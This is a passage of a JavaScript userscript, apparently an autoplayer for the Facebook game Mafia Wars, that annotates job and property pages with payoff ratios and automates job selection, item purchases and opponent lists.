  tierMastery(jobsFound, masteredJobsCount, currentTab);

  return true;
}

function isJobFight (jobAction) {
  DEBUG('checking to mark as fight job- - ');
  return (/fight/i.test(jobAction.innerHTML.untag() )  );
  }

function isJobLocked (jobAction) {
  return ((/lock/i.test(jobAction.innerHTML.untag()) || /complete/i.test(jobAction.innerHTML.untag())) && !/help/i.test(jobAction.innerHTML.untag()));
}

// Return item name if missing job item is from a business
function requiresBizItem (jobRow) {
  var reqItems = $x('.//div[@class="req_item"]//img', jobRow);
  if (reqItems && reqItems.length > 0) {
    for (var i = 0, iLength = reqItems.length; i < iLength; ++i) {
      if (!isNaN(bizJobItems.searchArray(reqItems[i].alt, 0)[0]))
        return reqItems[i].alt;
    }
  }
  return false;
}

function customizeJobs() {
  // Extras for jobs pages.
  var jobTables = $x('.//table[@class="job_list"]', innerPageElt);

  if (!jobTables || jobTables.length == 0) return false;

  var availableJobs = eval('({0:{},1:{},2:{},3:{},4:{},5:{}})');
  var masteredJobs = eval('({0:{},1:{},2:{},3:{},4:{},5:{}})');
  try {
    availableJobs = eval('(' + GM_getValue('availableJobs') + ')');
    masteredJobs = eval('(' + GM_getValue('masteredJobs') + ')');
  } catch (ex) {
    // ignore
  }
  var currentTab = currentJobTab();
  availableJobs[city][currentTab] = [];
  masteredJobs[city][currentTab] = [];

  // Display an experience to energy payoff ratio for each job.
  var bestJobs = [], worstJobs = [];
  var bestRatio = 0, worstRatio = 10;
  var reselectJob = false;
  var masteryList = getSavedList('masteryJobsList');

  var masteredJobsCount = 0;
  var jobsFound = 0;
  for (var x = 0, xLength = jobTables.length; x < xLength; ++x) {
    //newlv
    var jobNames = xpath('.//td[@class="job_name" or @class="job_name job_no_border" or @class="job_name " or @class="job_title " or @class="job_name_oneline job_no_border" ]', jobTables[x]);

    for (var i = 0, iLength = jobNames.snapshotLength; i < iLength; ++i) {
      var jobName = jobNames.snapshotItem(i).innerHTML.split('<br>')[0].clean().trim();

      // Skip this name if job row is not found
      var jobRow = getJobRow (jobName);
      if (!jobRow) continue;

      // Skip jobs not in missions array
      var jobMatch = missions.searchArray(jobName, 0)[0];
      if (isNaN(jobMatch)) {
        if (!/Level[\s\w]+Master/.test(jobName)) {
          var choiceMatch = choiceJobs.searchArray(jobName,1)[0];
          if (isNaN(choiceMatch))
            //
            DEBUG(jobName + ' not found in missions array.');
        }
        continue;
      }

      jobsFound++;
      var jobPercentage = getJobMastery(jobRow, false);
      var jobInfo = xpathFirst('.//td[contains(@class,"job_name") and contains(.,"Master")]', jobRow);
      var jobCost = xpathFirst('.//td[contains(@class,"job_energy")]', jobRow);
      var jobReward = xpathFirst('.//td[contains(@class,"job_reward")]', jobRow);
      var jobAction = xpathFirst('.//td[contains(@class,"job_action")]', jobRow);

      // Determine available jobs
      // Ignore mastered jobs
      if (jobPercentage == 100) {
        if (masteryList.length > 0 && masteryList.indexOf(String(jobMatch)) != -1)
          masteredJobs[city][currentTab].push(jobMatch);
        masteredJobsCount++;
      }

      // Skip locked jobs
      if (isJobLocked(jobRow)) {
        DEBUG('Job ' + jobName + '(' + jobMatch + ') is locked. Skipping.');
      } else {
        var item = requiresBizItem (jobRow);
        if (item != false) {
          DEBUG('Not enough business items ['+item+'] for ' + jobName + ' [' + jobMatch + ']. Skipping.');
        } else {
          availableJobs[city][currentTab].push(jobMatch);
        }
      }

      var costElt = xpathFirst('.//span[@class="bold_number"]', jobCost);
      // Skip this for jobs without cost
      if (!costElt) continue;
      var cost = parseInt(costElt.innerHTML);

      var expElt = xpathFirst('.//span[@class="bold_number"]', jobReward);
      var reward = parseInt(expElt.innerHTML);

      var moneyElt = xpathFirst('.//span[@class="money"]/strong', jobReward);

      // Display ratio and timer
      var ratio = Math.round(reward / cost * 100) / 100;

      makeElement('br', costElt.parentNode);
      makeElement('span', costElt.parentNode, {'style':'color:#666666; font-size: 10px'}).appendChild(document.createTextNode('Pays ' + ratio + 'x'));

      updateJobInfo(jobMatch, cost, reward, ratio);

      if (moneyElt) {
        var money = parseCash(moneyElt.innerHTML);
        var currency = cities[city][CITY_CASH_SYMBOL];
        var mratio = makeCommaValue(Math.round(money / cost));

        makeElement('span', moneyElt.parentNode, {'style':'color:#666666; font-size: 10px'}).appendChild(document.createTextNode(' (' + currency + mratio + ')'));
      }

      // Keep track of the best & worst payoffs.
      if (ratio > bestRatio) {
        bestRatio = ratio;
        bestJobs = [costElt];
      } else if (ratio == bestRatio) {
        bestJobs.push(costElt);
      }
      if (ratio < worstRatio) {
        worstRatio = ratio;
        worstJobs = [costElt];
      } else if (ratio == worstRatio) {
        worstJobs.push(costElt);
      }

      // Calculate time left for each job and display under the do job button
      var timePerEnergy = isGMChecked('isManiac') ? 3 : 5;
      timePerEnergy = isGMChecked('hasHelicopter') ? timePerEnergy - .5: timePerEnergy;
      timePerEnergy = isGMChecked('hasGoldenThrone') ? timePerEnergy/2: timePerEnergy;

      if (cost > energy) jobTimeLeftText = 'Time: ' + getDecimalTime((cost - energy) * timePerEnergy);
      else               jobTimeLeftText = 'Time: 0 min';

      makeElement('br', jobAction);
      makeElement('span', jobAction, {'style':'color:#666666; font-size: 10px'}).appendChild(document.createTextNode(jobTimeLeftText));
    }
  }

  // Highlight the best and worst jobs.
  var elt;
  if (worstRatio != bestRatio) {
    while (bestJobs.length) {
      elt = bestJobs.pop().parentNode;
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#52E259; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(yeahIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' BEST'));
    }
    while (worstJobs.length) {
      elt = worstJobs.pop().parentNode;
      makeElement('br', elt);
      elt = makeElement('span', elt, {'style':'color:#EC2D2D; font-size: 10px'});
      makeElement('img', elt, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
      elt.appendChild(document.createTextNode(' WORST'));
    }
  }

  // Show the experience to energy ratio needed to level up.
  elt = makeElement('div', null, {'id':'level_up_ratio', 'title':'Ratios needed to level up: combined, on energy only, on stamina only.',
                                  'style':'position:absolute; right:10px; width:80px; text-align:left; font-size:10px; display:none;'});
  jobTables[0].parentNode.insertBefore(elt, jobTables[0]);

  setLevelUpRatio();
  if(reselectJob) canMission();
  GM_setValue('availableJobs', JSON.stringify(availableJobs));
  GM_setValue('masteredJobs', JSON.stringify(masteredJobs));

  // Set the job progress
  jobMastery(innerPageElt, false);
  DEBUG('Jobs found: ' + jobsFound + ', Mastered jobs: ' + masteredJobsCount);
  tierMastery(jobsFound, masteredJobsCount, currentTab);

  return true;
}

function updateJobInfo (jobMatch, cost, reward, ratio) {
  var missionItem = missions[jobMatch];
  // If values are not in synch, update mission array
  if (!isNaN(jobMatch) &&
      (missionItem[MISSION_ENERGY] != cost ||
       missionItem[MISSION_XP] != reward ||
       missionItem[MISSION_RATIO] != ratio)) {

    missions[jobMatch][MISSION_ENERGY] = cost;
    missions[jobMatch][MISSION_XP] = reward;
    missions[jobMatch][MISSION_RATIO] = ratio;

    // Save joblist
    GM_setValue('missions', JSON.stringify(missions));
  }
}

function tierMastery(jobsFound, jobsMastered, currentTab) {
  if (running && GM_getValue('selectTier') != '0.0') {
    selectedTierValue = GM_getValue('selectTier').split('.');
    masteryCity = parseInt(selectedTierValue[0]);
    masteryTier = parseInt(selectedTierValue[1]);
    if (city == masteryCity &&
        masteryTier == currentTab &&
        jobsFound <= jobsMastered) {
      selectTier = cities[masteryCity][0] + ' - ' + missionTabs[masteryCity][masteryTier - 1];
      addToLog('info Icon', 'Tier ' + selectTier + ' is already mastered. Moving on to the next tier.');

      // Move on the the next tier.
      if (missionTabs[masteryCity].length == masteryTier) {
        // We have mastered all tiers. Disable tier mastery logic.
        if (cities.length == (masteryCity + 1)) {
          GM_setValue('selectTier', '0.0');
        // Next City
        } else {
          masteryCity++;
          masteryTier = 1;
        }
      // Next Tier
      } else {
        masteryTier++;
      }

      if (GM_getValue('selectTier') != '0.0') {
        var mastery_jobs_list = [];
        for (i = 0, iLength = missions.length; i < iLength; i++) {
          if (masteryCity == missions[i][MISSION_CITY] &&
              masteryTier == missions[i][MISSION_TAB]) {
            mastery_jobs_list.push(i);
          }
        }
        setSavedList('masteryJobsList', mastery_jobs_list);
        GM_setValue('selectTier', masteryCity + '.' + masteryTier);
      }
    }
  }
}

function customizeFight() {
  // No need to do this when AP is running
  if (running) return true;

  var opponents = getDisplayedOpponents(innerPageElt, true);
  if (!opponents) return false;

  // Customize the opponent list.
  var blacklist = getSavedList('fightListAvoid');
  for (var i = 0, iLength=opponents.length; i < iLength; ++i) {
    var opponent = opponents[i];
    if (!opponent.profile || !opponent.id) continue;

    // Mark targets that should be avoided.
    if (blacklist.indexOf(opponent.id) != -1) {
      var parentElt = opponent.profile.parentNode;
      var elt = makeElement('img', null, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle', 'title':'You have already lost to this opponent during automatic play.'});
      parentElt.insertBefore(elt, parentElt.firstChild);
    }
  }
  return true;
}

function customizeProps() {
  // Not on properties page (no <object> or <div> with @id="flash_content_propertiesV2" and no flashblock found)
  if (!xpathFirst('.//*[@id="flash_content_propertiesV2"]', innerPageElt) && !xpathFirst('.//div[@id="propertyV2Help"]', innerPageElt))
    return false;

  // Check flash
  var propsDiv = xpathFirst('.//div[@id="flash_content_propertiesV2"]', innerPageElt);
  if (!propsDiv) {
    // Flash is enabled (we either found an <object> or flashblock is active)
    isFlashed = FLASH_ENABLED;
    var flashLog = 'Warning: Flash is enabled. You must disable flash from your browser for PS MWAP to ' +
                   'get exact collect times, show property ROIs and auto-upgrade properties.<br>' +
                   'Visit <a href="http://www.playerscripts.com">PS MWAP for Firefox</a> or ' +
                   '<a href="http://www.playerscripts.com/index.php?option=com_jumi&fileid=3&Itemid=18">PS MWAP for Chrome</a> for instructions.';
    return true;
  }
  // Flash is disabled
  isFlashed = FLASH_DISABLED;

  GM_setValue('bestProp' + cities[city][CITY_NAME], 'skip');

  // Calculate ROIs and best buy
  var propRows = $x('.//tr[contains(@style,"margin-bottom")]', propsDiv);
  var bestElt, bestROI = 0;
  var worstElt, worstROI = 10;
  var nextTake = '1 day';
  for (var i = 0, iLength = propRows.length; i < iLength; ++i) {
    var props = $x('.//td[contains(@style,"padding-right")]', propRows[i]);

    var prop =  {'name'    : props[0].innerHTML,
                 'id'      : (i + 1),
                 'level'   : parseFloat(props[1].innerHTML),
                 'cost'    : parseFloat(props[2].innerHTML.untag().replace(/[\D]/gi,'')),
                 'take'    : parseFloat(props[3].innerHTML.replace(/[$,\,]/gi,'')),
                 'takeTime': parseFloat(props[3].innerHTML.replace(/.+\//g,''))
                }

    // ROI and Income per Level per Hour
    prop['ICpLpHR'] = prop['take'] / prop['level'] / prop['takeTime'];
    prop['roi'] = prop['ICpLpHR'] / prop['cost'];
    // prop['roi'] = propsData[i][1] / prop['cost'];

    // Set next take time
    if  (/href=/.test(props[4].innerHTML))
      nextTake = '00:00';
    else if (!/N\/A/.test(props[4].innerHTML) && timeLeft(props[4].innerHTML) < timeLeft(nextTake))
      nextTake = props[4].innerHTML;

    // Show Income per Level per Hour
    props[3].innerHTML += '<span style="color: green; font-size: 10px;"> ' + prop['ICpLpHR'].toFixed() + ' $/L/hr </span>'

    // Show ROI
    if (i > 0 && !isNaN(prop['roi'])) {
      props[3].innerHTML += '<br><span style="color: green; font-weight: bold; font-size: 10px;">ROI: '+prop['roi'].toExponential(4)+'</span>'

      // Best ROI
      if (prop['roi'] > bestROI) {
        bestElt = props[3];
        bestROI = prop['roi'];
        GM_setValue('bestProp' + cities[city][CITY_NAME], JSON.stringify(prop));
      }

      // Worst ROI
      if (prop['roi'] < worstROI) {
        worstElt = props[3];
        worstROI = prop['roi'];
      }
    }
    DEBUG(JSON.stringify(prop));

    // Casino is the last property
    if (/Casino/i.test(prop['name'])) break;
  }

  // Set next collection time
  DEBUG('Next '+cities[city][CITY_NAME]+' take: ' + nextTake);
  setGMTime('takeHour' + cities[city][CITY_NAME], nextTake);

  // Label best roi
  var elt = makeElement('span', bestElt, {'style':'color:#52E259; font-size: 10px'});
  makeElement('img', bestElt, {'src':stripURI(yeahIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
  elt.appendChild(document.createTextNode(' BEST'));

  // Label worst roi
  elt = makeElement('span', worstElt, {'style':'color:#EC2D2D; font-size: 10px'});
  makeElement('img', worstElt, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle'});
  elt.appendChild(document.createTextNode(' WORST'));

  DEBUG('Best ' + cities[city][CITY_NAME] + ' property: ' + JSON.stringify(GM_getValue('bestProp' + cities[city][CITY_NAME])));

  return true;
}

function customizeHitlist() {
  // No need to do this when AP is running
  if (running) return true;

  // Extras for hitlist.
  if (!onHitlistTab()) return false;

  // Get the displayed opponents.
  var opponents = getHitlist(innerPageElt, true);
  if (!opponents) return true;

  // Customize the opponent list.
  var blacklist = getSavedList('hitmanListAvoid').concat(getSavedList('fightListAvoid'));
  var kills = getSavedList('hitmanListKilled');
  for (var i = 0, iLength=opponents.length; i < iLength; ++i) {
    var opponent = opponents[i];
    if (!opponent.profile) continue;

    // Mark targets that should be avoided.
    var elt, parentElt;
    if (blacklist.indexOf(opponent.id) != -1) {
      parentElt = opponent.profile.parentNode;
      elt = makeElement('img', null, {'src':stripURI(omgIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle', 'title':'You have already lost to this opponent during automatic play.'});
      parentElt.insertBefore(elt, parentElt.firstChild);
    }

    // Mark targets on which bounties have already been collected.
    if (kills.indexOf(opponent.id) != -1) {
      parentElt = opponent.profile.parentNode;
      elt = makeElement('img', null, {'src':stripURI(lootbagIcon), 'width':'12', 'height':'12', 'style':'vertical-align:middle', 'title':'You have already collected a bounty on this target during automatic play.'});
      parentElt.insertBefore(elt, parentElt.firstChild);
    }
  }

  return true;
}
////
function customizeMissions() {
  Diagnose(' mission Customize pages adding INFO.');
//  AddFbIds();

}
////

function AddFbIds() {
  var boxes = document.getElementsByClassName('missionTaskBox');
  for(i = 0, numboxes = boxes.length; i<numboxes; i++) {
    if(boxes[i].getElementsByClassName('missionTaskImage').length)  {
     var fbid=/_(\d+)_/.exec(boxes[i].getElementsByClassName('missionTaskImage')[0].innerHTML);
      if(fbid) {
        var newItem='http://www.facebook.com/profile.php?id='+fbid[1];
        var addfbid1 = makeElement('a',boxes[i],{'href':newItem});
        addfbid1.appendChild(document.createTextNode('FB: '+fbid[1] ));
//      addfbid1.appendChild(document.createTextNode('Mission ID: '+ Miss_ID ) );
      }
    }
  }
}
////

function setLevelUpRatio() {
  var elt = document.getElementById('level_up_ratio');
  if (elt) {
    var ratioHTML = '';
    if (stamina || energy) {
      var ratio = Math.ceil((ptsToNextLevel) / (energy + stamina) * 100) / 100;
      ratioHTML = 'Combined: ' + (ratio > 20 ? '> 20' : ratio) + 'x<br>';
      if (energy) {
        var ratioEnergy = Math.ceil((ptsToNextLevel) / energy * 100) / 100;
        ratioHTML += 'Energy: ' + (ratioEnergy > 20 ? '> 20' : ratioEnergy) + 'x<br>';
      }
      if (stamina) {
        var ratioStamina = Math.ceil((ptsToNextLevel) / stamina * 100) / 100;
        ratioHTML += 'Stamina: ' + (ratioStamina > 20 ? '> 20' : ratioStamina) + 'x';
      }
    }
    elt.innerHTML = ratioHTML;
    if (ratio)
      elt.style.display = 'block';
    else
      elt.style.display = 'none';
  }
}

// Callback for clicking 'Add to Fight List' on profile page.
function clickFightListAdd() {
  addSavedListItem('pfightlist', this.id);
  this.firstChild.nodeValue = 'Remove from Fight List';
  this.removeEventListener('click', clickFightListAdd, false);
  this.addEventListener('click', clickFightListRemove, false);
  var el = document.getElementById('pfightlist');
  if (el) {
    el.value = GM_getValue('pfightlist', '');
  }
}

// Callback for clicking 'Remove from Fight List' on profile page.
function clickFightListRemove() {
  while(removeSavedListItem('pfightlist', this.id))
  this.firstChild.nodeValue = 'Add to Fight List';
  this.removeEventListener('click', clickFightListRemove, false);
  this.addEventListener('click', clickFightListAdd, false);
  var el = document.getElementById('pfightlist');
  if (el) {
    el.value = GM_getValue('pfightlist', '');
  }
}

// Callback for clicking 'Add to AutoHit List' on profile page.
function clickAutoHitListAdd() {
  addSavedListItem('pautoHitOpponentList', this.id);
  this.firstChild.nodeValue = 'Remove from AutoHit List';
  this.removeEventListener('click', clickAutoHitListAdd, false);
  this.addEventListener('click', clickAutoHitListRemove, false);
  var el = document.getElementById('pautoHitOpponentList');
  if (el) {
    el.value = GM_getValue('pautoHitOpponentList', '');
  }
}

// Callback for clicking 'Remove from AutoHit List' on profile page.
function clickAutoHitListRemove() {
  while(removeSavedListItem('pautoHitOpponentList', this.id))
  this.firstChild.nodeValue = 'Add to AutoHit List';
  this.removeEventListener('click', clickAutoHitListRemove, false);
  this.addEventListener('click', clickAutoHitListAdd, false);
  var el = document.getElementById('pautoHitOpponentList');
  if (el) {
    el.value = GM_getValue('pautoHitOpponentList', '');
  }
}

// Callback for clicking 'Add to War List' on profile page.
function clickWarListAdd() {
  addSavedListItem('autoWarTargetList', this.id);
  this.firstChild.nodeValue = 'Remove from War List';
  this.removeEventListener('click', clickWarListAdd, false);
  this.addEventListener('click', clickWarListRemove, false);
  var el = document.getElementById('autoWarTargetList');
  if (el) {
    el.value = GM_getValue('autoWarTargetList', '');
  }
}

// Callback for clicking 'Remove from War List' on profile page.
function clickWarListRemove() {
  while(removeSavedListItem('autoWarTargetList', this.id))
  this.firstChild.nodeValue = 'Add to War List';
  this.removeEventListener('click', clickWarListRemove, false);
  this.addEventListener('click', clickWarListAdd, false);
  var el = document.getElementById('autoWarTargetList');
  if (el) {
    el.value = GM_getValue('autoWarTargetList', '');
  }
}

function getJobRow(jobName, contextNode) {
  var rowElt, conTxt = '',LVjob=0;
  try {
    // Retrieve by job number first
    var jobMatch = missions.searchArray(jobName, 0)[0];
    if (!isNaN(jobMatch)) {
      var jobno = missions[jobMatch][MISSION_NUMBER];
      rowElt = xpathFirst('.//table[@class="job_list"]//a[contains(@onclick, "job=' + jobno + '&")]', contextNode);
      //Fetching logic for Vegas jobs
      if (!rowElt && (city==LV || city==ITALY)) {
        var jobContainer = "job"+jobno;
        rowElt = xpathFirst('.//div[@id="'+jobContainer+'"]', contextNode);
        LVjob = 1;
      }
    }

    // cheat way to buy needed stuff and not wait for a reply   works as is
    var elt = xpathFirst('.//a[contains(@onclick, "MapController.buyItems('+jobno+'); return false;")]') ;
    if(elt) {
      DEBUG('Cheating on buying for now found a link to click - - jobno=' + jobno );
      clickElement(elt);
    }

    // If no rows found, retrieve by name
    if (!rowElt) {
      // Tokenize job name words
      var jobNameTokens = jobName.replace (/"/g,' ').replace(/'/g, ' ').split(' ');
      for (var i = 0; i < jobNameTokens.length; ++i) {
        if (jobNameTokens[i].length > 1) {
          if (conTxt.length > 0) conTxt += ' and ';
          conTxt += 'contains(., "'+jobNameTokens[i]+'")';
        }
      }
      rowElt = xpathFirst('.//table[@class="job_list"]//tr//td['+conTxt+']', contextNode);
    }

    // Get the parent TR
    if (rowElt && !LVjob){
      while (rowElt.tagName != "TR") rowElt = rowElt.parentNode;
    }

    // Fetching logic for new job rows
    if (!rowElt) rowElt = xpathFirst('.//div[@id="new_user_jobs"]//div[contains(@class, "job clearfix") and '+conTxt+']', contextNode);

  } catch(ex) {
    addToLog('warning Icon', 'BUG DETECTED (getJobRow): [exception: ' + ex + '], [conTxt: ' + conTxt + '], [jobName: ' + jobName + ']');
    DEBUG('BUG DETECTED (getJobRow): [exception: ' + ex + '], [conTxt: ' + conTxt + '], [jobName: ' + jobName + ']');
  }
  if (!rowElt) return false;
  return rowElt;
}
////
function getJobRowItems(jobName) {
  var currentJob = jobName;
  var currentJobRow = getJobRow(currentJob, innerPageElt);
  if (!currentJobRow) return false;
  var inner = innerPageElt? innerPageElt.innerHTML : '';
  var innerNoTags = inner.untag();

  if (innerNoTags.match(/You do not have enough cash to buy/i)) {
    addToLog('warning Icon', 'You don\'t have enough cash to buy necessary equipment.');
    var jobs = getSavedList('jobsToDo', '');
    if (jobs.indexOf(currentJob) == -1) {
      jobs.push(currentJob);
      DEBUG('Saving ' + currentJob + ' for later. Need to farm cash first.');
      setSavedList('jobsToDo', jobs);
      return true;
    } else {
      GM_setValue('autoMission', 0);
      //newchange
      update_nrg_stam(); // update the icon to show energy spend is off
      addToLog('warning Icon', 'No more available jobs in jobsToDo list, so turning off autoMission.');
      return false;
    }
  }

  var buyItemElts = $x('.//a[contains(@onclick, "xw_action=buy_item")]',currentJobRow);
  if(!buyItemElts) buyItemElts = $x('.//a[contains(@onclick, "MapController.buyItems")]',currentJobRow);

  // Click to buy items
  if (buyItemElts.length > 0){
    addToLog('search Icon', 'Attempting to purchase required items.');
    for (var i = 0, numItems=buyItemElts.length; i < numItems; ++i) {
      Autoplay.fx = function() {
        clickAction = 'buy item';
        clickElement(buyItemElts[i]);
        DEBUG('Clicked to buy item.');
      };
      break;
    }
    return true;
  }

  // New Job layout handling
  var amtElt = xpathFirst('.//strong[@class="cash cash_'+cities[city][CITY_ALIAS]+'"]', currentJobRow);
  if(!amtElt) amtElt = xpathFirst('.//div[@class="job_uses"]//dd[@class="vegas_cash_icon"]', currentJobRow);
  if(!amtElt) amtElt = xpathFirst('.//div[@class="job_uses"]//dd[@class="italy_cash_icon"]', currentJobRow);
  if (amtElt) {
    var cashDiff = parseCash(amtElt.innerHTML.untag().trim()) - cities[city][CITY_CASH];
    // Withdraw the amount we need
    if (cashDiff > 0) {
      DEBUG('We need '+cashDiff+' for this job. Going to the bank/vault of '+city);
      suspendBank = true;
      return (autoBankWithdraw(cashDiff));
    }
  }

  // Logic to switch to the required job first
  var necessaryItems = $x('.//div[@class="req_item"]//img', currentJobRow);

  // Figure out which loot items are needed before this job can be attempted
  // again and, consequently, which jobs will have to be done to get them.
  if (necessaryItems.length > 0) {
    DEBUG('Some Items Required for this job - req_item');
    // Save the current job for later. The current job should not already exist in the list, so check first.
    var items = getSavedList('itemList');
    var jobs = getSavedList('jobsToDo', '');
    if (jobs.indexOf(currentJob) == -1) {
      jobs.push(currentJob);
      DEBUG('Saving ' + currentJob + ' for later. Need to fetch pre-req items first.');
      setSavedList('jobsToDo', jobs);
    }

    var itemsFound = false;
    necessaryItems.forEach(
      function(i){
        var itmSearch = i.alt;        
        itmSearch = itmSearch.replace(/set of/i, '');
        itmSearch = itmSearch.replace(/\[(.+?)\]/i, '');
        itmSearch = itmSearch.trim();
        DEBUG(itmSearch);
        var itemFound = false;
        // Try fetching the items from the job requirement array
        requirementJob.forEach(
          function(j){
            if (level >= cities[j[2]][CITY_LEVEL] && j[0].toUpperCase().trim() == itmSearch.toUpperCase().trim()) {
              jobs.push(j[1]);
              items.push(itmSearch);
              itemFound = true;
            }
          }
        );

        // Set the flag if at least one item is found
        if (itemFound) itemsFound = true;
        else DEBUG(itmSearch + ' not found in the requirement job array.');
      }
    );

    // At least one item found
    if (itemsFound) {
      setSavedList('itemList', items.unique());
      setSavedList('jobsToDo', jobs);
      popJob();
      return true;
    }
  } else {
    necessaryItems = xpathFirst('.//span[@class="missing_req_items"]', currentJobRow);
    itmSearch='';
    if(necessaryItems){
      DEBUG('Some Items Required for this job - missing_req_items');
      itmSearch = necessaryItems.innerHTML;
      if(itmSearch.match(/(.+?),/i)) itmSearch = RegExp.$1;
      DEBUG('Missing Item: ' + itmSearch);
      itmSearch = itmSearch.replace(/\(.+?\)/gi, '').trim();
      DEBUG('Parsed Missing Item: ' + itmSearch);
    } else {
      necessaryItems = xpathFirst('.//div[@class="needed_gate_loot_container"]', currentJobRow);
      if(!necessaryItems) necessaryItems = xpathFirst('.//div[@class="needed_gate_loot"]', currentJobRow);
      if(necessaryItems){
        DEBUG('Some Items Required for this job - needed_gate_loot');
        messages = $x('.//img', necessaryItems);
        numMessages = messages.length;
        for (i = 0; i < numMessages; i++) {
          var item = messages[i].title;          
          if(!item.match(/Gift this/i)){            
            if (itmSearch == '') {
              itmSearch = item;
            } else {
              itmSearch = itmSearch + ', ' + item;
            }
          }
        }
        DEBUG('Missing Item(s): ' + itmSearch);
      }
    }

    if(itmSearch!=''){
      DEBUG('Item(s) Required for this job : '+itmSearch);
      // Save the current job for later. The current job should not already exist in the list, so check first.
      var items = getSavedList('itemList');
      var jobs = getSavedList('jobsToDo', '');
      DEBUG('Current Job List: '+jobs);
      if (jobs.indexOf(currentJob) == -1) {
        jobs.push(currentJob);
        DEBUG('Saving ' + currentJob + ' for later. Need to fetch pre-req items first.');
        setSavedList('jobsToDo', jobs);
      } else {
       DEBUG(currentJob + ' already saved for later. Need to fetch pre-req items first.');
      }

      var itemFound = false;
      // Try fetching the items from the job requirement array
      requirementJob.forEach(
        function(j){
          if (level >= cities[j[2]][CITY_LEVEL] && j[0].toUpperCase().trim() == itmSearch.toUpperCase().trim()) {
            jobs.push(j[1]);
            items.push(itmSearch.trim());
            itemFound = true;
            jobFound = j[1];
          }
        }
      );

      // Set the flag if at least one item is found
      if (!itemFound) DEBUG(itmSearch + ' not found in the requirement job array.');
      else {
        setSavedList('itemList', items.unique());
        setSavedList('jobsToDo', jobs);
        popJob();
        return true;
      }
    }
  }

  // Withdraw money
  var amtElt = xpathFirst('.//td[contains(@class,"job_energy")]//span[@class="money" or @class="bad"]', currentJobRow);
  if (amtElt) {
    var cashDiff =  parseCash(amtElt.innerHTML) - cities[city][CITY_CASH];

    // Withdraw the amount we need
    if (cashDiff > 0) {
      suspendBank = true;
      return (autoBankWithdraw(cashDiff));
    }
  }

  return false;
}
function popJob(){
  var jobs = getSavedList('jobsToDo', '');
  // Set the very next job to perform.
  var doJob = jobs.pop();
  setSavedList('jobsToDo', jobs);
  var i = 0;
  missions.forEach(
    function(f) {
      if (f[0].toUpperCase().trim() == doJob.toUpperCase().trim()) {
        GM_setValue('selectMission', i);
        addToLog('info Icon', 'Switching job to ' + doJob + '.');
      }
      i++;
    }
  );
}

// Set the next job to be done for job combination options
function jobCombo(element) {
  var i;
  // Cycle jobs with the same ratio
  var availableJobs = eval('(' + GM_getValue('availableJobs', "{0:{},1:{},2:{},3:{},4:{},5:{}}") + ')');
  var multiple_jobs_list = getSavedList('selectMissionMultiple');
  var cycle_jobs = new Object();

  // Group selected jobs by ratio
  for (i = 0, iLength=multiple_jobs_list.length; i < iLength; ++i) {
    var job = multiple_jobs_list[i];
    var mission = missions[job];
    if(!mission) continue;
    // Put non-available jobs at the end of the queue
    if (availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]] != null &&
        availableJobs[mission[MISSION_CITY]][mission[MISSION_TAB]].indexOf(parseInt(job)) == -1) {
      mission[MISSION_RATIO] = 0;
    }

    if (cycle_jobs[mission[MISSION_RATIO]] == null) {
      cycle_jobs[mission[MISSION_RATIO]] = [];
    }
    cycle_jobs[mission[MISSION_RATIO]].push(multiple_jobs_list[i]);
  }

  // Rebuild the job list array
  multiple_jobs_list = [];
  for (i in cycle_jobs) {
    if (cycle_jobs[i].length > 1) {
      // Only cycle the current job's ratio group
      if (missions[GM_getValue('selectMission', 1)][MISSION_RATIO] == i) {
        cycle_jobs[i].push(cycle_jobs[i].shift());
      }
      for (var n = 0, nLength=cycle_jobs[i].length; n < nLength; ++n) {
        multiple_jobs_list.push(cycle_jobs[i][n]);
      }
    } else {
      multiple_jobs_list.push(cycle_jobs[i][0]);
    }
  }
  setSavedList('selectMissionMultiple', multiple_jobs_list);
}

function jobLoot(element) {
  var i, lootbag = [];
  var strLoot = '';
  // See what loot was gained.
  var messages = $x('.//td[@class="message_body"]', element);
  var numMessages = messages.length;
  for (i = 1; i < numMessages; i++) {
    var innerNoTags = messages[i].innerHTML.untag();
    if (innerNoTags.match(/you\s+?gained:\s+?an?\s+?(.+)\./i) ||
        innerNoTags.match(/you\s+gained(?:\s+an?)?\s+(.+)\./i) ||
        innerNoTags.match(/found(?:\s+an?)?\s+(.*?)\s+on\s+the/i) ||
        innerNoTags.match(/earned(?:\s+an?)?\s+(.*?)\.\s+you\s+/i)) {
      var loot = RegExp.$1;
      if(loot.match(/(.+?)\s+?was(.+?)(\d+)/i)) loot = RegExp.$1+' x '+RegExp.$3;
      else if(loot.match(/(.+?)\s+?(\.|-)?\s+?used?(.+?)(\d+)/i)) loot = RegExp.$1+' x '+RegExp.$4;
      if (strLoot) strLoot += '<br/>'+'Found <span class="loot">'+loot+'</span> in the job.';
      else strLoot = 'Found <span class="loot">' + loot+'</span> in the job.';
      lootbag.push(loot);
    }
  }
  if (numMessages > 0 && strLoot !='')
    addToLog('lootbag Icon', strLoot);

  // Vegas Loot on jobs
  if (city == LV||city==ITALY) {
    var jobResults = xpathFirst('.//div[@class="job_results"]', element);
    strLoot = '';
    messages = $x('.//img', jobResults);
    numMessages = messages.length;
    for (i = 0; i < numMessages; i++) {
      if(messages[i].title){
        var loot = messages[i].title;
        var parentText = messages[i].parentNode.innerHTML.untag();
        if(parentText.match(/(\d+)/)) parentText = ' x ' + RegExp.$1;
        if(loot.match(/(.+?)(\.|-)?\s+?(was|used?)/i)) loot = RegExp.$1;
        if (strLoot) strLoot += '<br/>'+'Found <span class="loot">'+loot+' ' +parentText+'</span> in the job.';
        else strLoot = 'Found <span class="loot">' + loot+' ' +parentText+'</span> in the job.';
        lootbag.push(loot);
      }
    }
    if (numMessages > 0 && strLoot !='') {
      addToLog('lootbag Icon', strLoot);
    }
  }

  DEBUG('Found ' + lootbag.length + ' item(s) on this job.');

  var items = getSavedList('itemList');
  if (typeof(items[0]) == 'undefined' || items.length == 0) {
    DEBUG('No items in required item list.');
    return;
  }

  var itemFound = false;
  var itemName;
  // NOTE: The single equal sign is intentional in this while() condition.
